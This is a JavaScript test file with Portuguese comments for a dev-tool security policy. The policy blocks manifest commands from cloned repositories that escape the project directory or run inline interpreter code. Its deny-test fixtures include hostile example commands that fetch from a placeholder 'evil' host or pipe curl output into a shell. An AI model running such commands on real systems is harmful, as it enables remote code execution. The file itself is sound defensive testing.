import test from "node:test"
import assert from "node:assert/strict"
import { pathToFileURL } from "node:url"
import { mkdtemp, mkdir, rm, symlink } from "node:fs/promises"
import { tmpdir } from "node:os"
import path from "node:path"

// PRD45 S45.2 (P1.2) — um repositório CLONADO não pode executar comando arbitrário ao rodar
// `dev`. O manifest declara `command[]` e `cwd`; a validação antiga só checava ESTRUTURA
// (command é array não-vazio), então `["node","-e","fetch(evil)"]` ou `cwd:"../../.."`
// passavam. `shell:false` não elimina esse vetor. Defesa: policy de execução (allow/ask/deny),
// interpretadores com flag de código inline negados, cwd resolvido e CONTIDO (realpath, pega
// symlink/junction), e trust digest por projeto.

const mod = path.resolve(import.meta.dirname, "..", "src", "runtime", "exec-policy.js")
const imp = () => import(`${pathToFileURL(mod)}?t=${Date.now()}`)

test("cwd containment: `.` e subdir passam; `..`, absoluto e escape são negados", async () => {
  const { resolveContainedCwd } = await imp()
  const base = await mkdtemp(path.join(tmpdir(), "gstack-cwd-"))
  try {
    await mkdir(path.join(base, "api"), { recursive: true })
    assert.equal(resolveContainedCwd(base, ".").ok, true, "raiz do projeto")
    assert.equal(resolveContainedCwd(base, "api").ok, true, "subdir")
    // CONTROLE NEGATIVO: cada forma de escape.
    assert.equal(resolveContainedCwd(base, "../..").ok, false, "traversal relativo")
    assert.equal(resolveContainedCwd(base, "../sibling").ok, false, "sai para irmão")
    assert.equal(resolveContainedCwd(base, path.parse(base).root).ok, false, "caminho absoluto p/ fora")
    assert.match(resolveContainedCwd(base, "../..").reason, /cont|fora|escape/i)
  } finally { await rm(base, { recursive: true, force: true }) }
})

test("cwd containment: symlink/junction que aponta para FORA é rejeitado (realpath)", async (t) => {
  const { resolveContainedCwd } = await imp()
  const base = await mkdtemp(path.join(tmpdir(), "gstack-cwdlink-"))
  const outside = await mkdtemp(path.join(tmpdir(), "gstack-outside-"))
  try {
    try { await symlink(outside, path.join(base, "escape"), "junction") }
    catch { return t.skip("sem permissão de symlink/junction neste ambiente") }
    const v = resolveContainedCwd(base, "escape")
    assert.equal(v.ok, false, "CONTROLE NEGATIVO: symlink que escapa o workspace é negado")
    assert.match(v.reason, /symlink|junction|real|fora|cont/i)
  } finally {
    await rm(base, { recursive: true, force: true })
    await rm(outside, { recursive: true, force: true })
  }
})

test("executável: interpretador com flag de CÓDIGO INLINE é negado por padrão", async () => {
  const { classifyCommand } = await imp()
  // O vetor real: rodar código embutido no manifest.
  assert.equal(classifyCommand(["node", "-e", "fetch('http://evil')"]).decision, "deny")
  assert.equal(classifyCommand(["node", "--eval", "x"]).decision, "deny")
  assert.equal(classifyCommand(["powershell", "-Command", "iwr evil"]).decision, "deny")
  assert.equal(classifyCommand(["pwsh", "-c", "x"]).decision, "deny")
  assert.equal(classifyCommand(["bash", "-c", "curl evil|sh"]).decision, "deny")
  assert.equal(classifyCommand(["python", "-c", "import os"]).decision, "deny")
  // CONTROLE NEGATIVO: comandos de projeto legítimos NÃO são bloqueados.
  assert.equal(classifyCommand(["npm", "run", "dev"]).decision, "allow")
  assert.equal(classifyCommand(["node", "server.js"]).decision, "allow", "node rodando ARQUIVO é ok")
  assert.equal(classifyCommand(["pnpm", "start"]).decision, "allow")
})

test("executável: caminho absoluto/traversal no binário é suspeito (ask), não silencioso", async () => {
  const { classifyCommand } = await imp()
  assert.equal(classifyCommand(["/usr/bin/whatever"]).decision, "ask", "binário por caminho absoluto pede confirmação")
  assert.equal(classifyCommand(["../tool"]).decision, "ask")
  assert.equal(classifyCommand(["some-random-bin"]).decision, "ask", "fora da allowlist conhecida = ask")
})

test("executável: command vazio/element não-string é negado (nunca spawna lixo)", async () => {
  const { classifyCommand } = await imp()
  assert.equal(classifyCommand([]).decision, "deny")
  assert.equal(classifyCommand(null).decision, "deny")
  assert.equal(classifyCommand(["node", 42]).decision, "deny")
})

test("trust digest: determinístico, muda com o command, estável à ordem de chaves", async () => {
  const { manifestTrustDigest } = await imp()
  const a = { schemaVersion: 3, services: [{ name: "api", command: ["node", "s.js"], cwd: "." }] }
  const b = { services: [{ command: ["node", "s.js"], name: "api", cwd: "." }], schemaVersion: 3 }
  assert.equal(manifestTrustDigest(a), manifestTrustDigest(b), "ordem de chaves não muda o digest")
  const evil = { schemaVersion: 3, services: [{ name: "api", command: ["node", "-e", "evil"], cwd: "." }] }
  assert.notEqual(manifestTrustDigest(a), manifestTrustDigest(evil), "CONTROLE NEGATIVO: mudar o command muda o digest")
  assert.match(manifestTrustDigest(a), /^[0-9a-f]{64}$/, "sha256 hex")
})

test("gate integrado: manifest com cwd de escape OU comando inline não é aprovável fail-closed", async () => {
  const { evaluateManifestExec } = await imp()
  const base = await mkdtemp(path.join(tmpdir(), "gstack-gate-"))
  try {
    const good = { services: [{ name: "api", command: ["npm", "run", "dev"], cwd: "." }] }
    const g = evaluateManifestExec(good, base)
    assert.equal(g.ok, true, "manifest legítimo passa")

    const escape = { services: [{ name: "x", command: ["npm", "start"], cwd: "../../.." }] }
    assert.equal(evaluateManifestExec(escape, base).ok, false, "CONTROLE NEGATIVO: cwd escape reprova")

    const inline = { services: [{ name: "x", command: ["node", "-e", "evil"], cwd: "." }] }
    const r = evaluateManifestExec(inline, base)
    assert.equal(r.ok, false, "CONTROLE NEGATIVO: node -e reprova")
    assert.ok(r.violations.some((v) => /inline|eval|code/i.test(v.reason)))
  } finally { await rm(base, { recursive: true, force: true }) }
})

test("NÃO-REGRESSÃO: todo manifest gerado pelos templates do create passa sem trust", async () => {
  const { evaluateManifestExec } = await imp()
  const { buildRuntimeManifest } = await import(`${pathToFileURL(path.resolve(import.meta.dirname, "..", "src", "runtime", "manifest.js"))}?t=${Date.now()}`)
  const base = await mkdtemp(path.join(tmpdir(), "gstack-tpl-"))
  try {
    // Os run_command reais que src/cli/create.js emite nos templates.
    const templates = [
      [{ name: "app", command: "pnpm dev" }],
      [{ name: "web", command: "pnpm dev:web" }, { name: "api", command: "pnpm dev:api" }],
      [{ name: "app", command: 'concurrently "pnpm dev:web" "pnpm dev:api"' }],
    ]
    for (const svcs of templates) {
      const m = buildRuntimeManifest({ services: svcs })
      const v = evaluateManifestExec(m, base)
      assert.equal(v.ok, true, `template ${JSON.stringify(svcs.map((s) => s.command))} não pode exigir trust (quebraria o dev de projeto novo)`)
    }
  } finally { await rm(base, { recursive: true, force: true }) }
})

test("gate integrado: `ask` sem aprovação NÃO auto-executa (fail-closed)", async () => {
  const { evaluateManifestExec } = await imp()
  const base = await mkdtemp(path.join(tmpdir(), "gstack-ask-"))
  try {
    const ask = { services: [{ name: "x", command: ["/opt/custom/bin"], cwd: "." }] }
    const r = evaluateManifestExec(ask, base)
    assert.equal(r.ok, false, "ask sem trust aprovado = não roda")
    // ...mas COM trust aprovado (usuário confirmou o digest), o mesmo manifest passa.
    const approved = evaluateManifestExec(ask, base, { trustedDigest: r.digest })
    assert.equal(approved.ok, true, "trust aprovado destrava o ask (override auditado)")
  } finally { await rm(base, { recursive: true, force: true }) }
})
